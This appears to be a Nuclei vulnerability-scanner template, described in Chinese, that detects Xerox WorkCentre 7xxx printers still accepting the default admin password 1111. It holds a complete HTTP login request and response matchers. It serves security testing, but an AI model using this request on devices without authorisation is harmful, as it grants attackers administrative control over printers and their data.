id: xerox7-default-login

info:
  name: Xerox WorkCentre 7xxx Printer 默认口令登录（弱口令）
  author: MiroslavSotak
  severity: high
  description: 该模板通过尝试 Xerox WorkCentre 7xxx Printer 的默认管理员账号口令（如 admin:1111），并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.support.xerox.com/en-us/article/en/x_wc7556_en-O23530
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: xerox,default-login,vuln

http:
  - raw:
      - |
        POST /userpost/xerox.set HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername={{username}}&webPassword={{password}}&frmaltDomain=default

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - 1111

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "window.opener.top.location.pathname"
          - "Xerox Corporation"
        condition: and

      - type: word
        part: body
        words:
          - "invalid"
          - "errmsg"
        condition: or
        negative: true
